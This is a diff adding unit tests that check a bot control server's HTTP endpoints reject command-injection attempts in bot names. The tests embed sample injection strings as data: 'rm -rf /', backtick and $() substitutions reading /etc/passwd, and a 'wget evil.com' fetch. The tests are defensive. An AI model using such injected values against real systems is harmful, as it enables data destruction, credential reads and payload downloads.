@@ -221,5 +221,217 @@ class TestPauseResumeBotValidation(unittest.TestCase):
             self.assertIn("unknown bot", body.get("error", "").lower())
 
 
+class TestCommandInjectionPrevention(unittest.TestCase):
+    """Verify that command injection attempts are rejected across all endpoints.
+
+    Ticket: CB-8897336-6B72 — Critical: Command injection via pkill in bot control handlers
+
+    Acceptance Criteria:
+    - Bot name validated against alphanumeric+hyphen pattern before subprocess calls
+    - shlex.quote() applied to all interpolated values
+    - security tests verify injection attempts are rejected
+    """
+
+    def _make_handler(self, method: str, path: str, body: dict | None = None):
+        """Create a mock request handler for testing."""
+        from codebot.control_server import ControlHandler
+
+        handler = MagicMock(spec=ControlHandler)
+        handler.path = path
+        handler.command = method
+        handler.headers = {"Authorization": "Bearer test-token"}
+        if body is not None:
+            handler.rfile = BytesIO(json.dumps(body).encode())
+            handler.headers["Content-Length"] = str(len(json.dumps(body)))
+        else:
+            handler.rfile = BytesIO(b"")
+            handler.headers["Content-Length"] = "0"
+        return handler
+
+    @patch("codebot.control_server.BOT_REGISTRY", [])
+    def test_restart_rejects_injection_via_semicolon(self):
+        """Restart endpoint must reject bot names containing semicolons."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/test; rm -rf /restart")
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: (None, None, None)
+
+        with patch("codebot.control_server.subprocess.run") as mock_run:
+            ControlHandler.do_POST(handler)
+            mock_run.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [])
+    def test_pause_rejects_injection_via_backticks(self):
+        """Pause endpoint must reject bot names containing backticks."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/test`whoami`/pause")
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: (None, None, None)
+
+        with patch("codebot.control_server.subprocess.run") as mock_run:
+            ControlHandler.do_POST(handler)
+            mock_run.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [])
+    def test_resume_rejects_injection_via_dollar_sign(self):
+        """Resume endpoint must reject bot names containing dollar signs."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/test$(cat /etc/passwd)/resume")
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: (None, None, None)
+
+        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
+            ControlHandler.do_POST(handler)
+            mock_popen.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
+    def test_start_rejects_injection_via_semicolon(self):
+        """Start endpoint must reject bot names containing semicolons."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test; rm -rf /"]})
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: ({"bots": ["test; rm -rf /"]}, None, None)
+
+        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
+            ControlHandler.do_POST(handler)
+            mock_popen.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
+    def test_start_rejects_injection_via_pipe(self):
+        """Start endpoint must reject bot names containing pipe characters."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test|cat /etc/passwd"]})
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: ({"bots": ["test|cat /etc/passwd"]}, None, None)
+
+        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
+            ControlHandler.do_POST(handler)
+            mock_popen.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
+    def test_stop_rejects_injection_via_ampersand(self):
+        """Stop endpoint must reject bot names containing ampersands."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/stop", body={"bots": ["test&wget evil.com"]})
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: ({"bots": ["test&wget evil.com"]}, None, None)
+
+        with patch("codebot.control_server.subprocess.run") as mock_run:
+            ControlHandler.do_POST(handler)
+            mock_run.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
+    def test_start_validates_each_bot_name(self):
+        """Start endpoint must validate each bot name in the array."""
+        from codebot.control_server import ControlHandler
+
+        # First bot is valid, second is malicious
+        handler = self._make_handler("POST", "/bots/start", body={"bots": ["valid-bot", "evil; rm -rf /"]})
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: ({"bots": ["valid-bot", "evil; rm -rf /"]}, None, None)
+
+        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
+            ControlHandler.do_POST(handler)
+            mock_popen.assert_not_called()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 400)
+        self.assertIn("invalid bot name", body.get("error", "").lower())
+
+    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
+    def test_start_accepts_valid_bot_names(self):
+        """Start endpoint must accept valid bot names."""
+        from codebot.control_server import ControlHandler
+
+        handler = self._make_handler("POST", "/bots/start", body={"bots": ["valid-bot"]})
+        responses = []
+        handler._json = lambda code, data, r=responses: r.append((code, data))
+        handler._auth = lambda: True
+        handler._read_json_body = lambda: ({"bots": ["valid-bot"]}, None, None)
+
+        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
+            ControlHandler.do_POST(handler)
+            mock_popen.assert_called_once()
+
+        self.assertTrue(len(responses) > 0)
+        status_code, body = responses[0]
+        self.assertEqual(status_code, 200)
+        self.assertTrue(body["ok"])
+
+    def test_validate_bot_name_function(self):
+        """Test the validate_bot_name function directly."""
+        from codebot.control_server import validate_bot_name
+
+        # Valid names
+        self.assertTrue(validate_bot_name("valid-bot"))
+        self.assertTrue(validate_bot_name("valid_bot"))
+        self.assertTrue(validate_bot_name("ValidBot123"))
+        self.assertTrue(validate_bot_name("a"))
+        self.assertTrue(validate_bot_name("123"))
+
+        # Invalid names
+        self.assertFalse(validate_bot_name("test; rm -rf /"))
+        self.assertFalse(validate_bot_name("test`whoami`"))
+        self.assertFalse(validate_bot_name("test$(cat /etc/passwd)"))
+        self.assertFalse(validate_bot_name("test|cat /etc/passwd"))
+        self.assertFalse(validate_bot_name("test&wget evil.com"))
+        self.assertFalse(validate_bot_name("test/../etc/passwd"))
+        self.assertFalse(validate_bot_name("test space"))
+        self.assertFalse(validate_bot_name(""))
+        self.assertFalse(validate_bot_name(None))
+        self.assertFalse(validate_bot_name(123))
+
+
 if __name__ == "__main__":
     unittest.main()
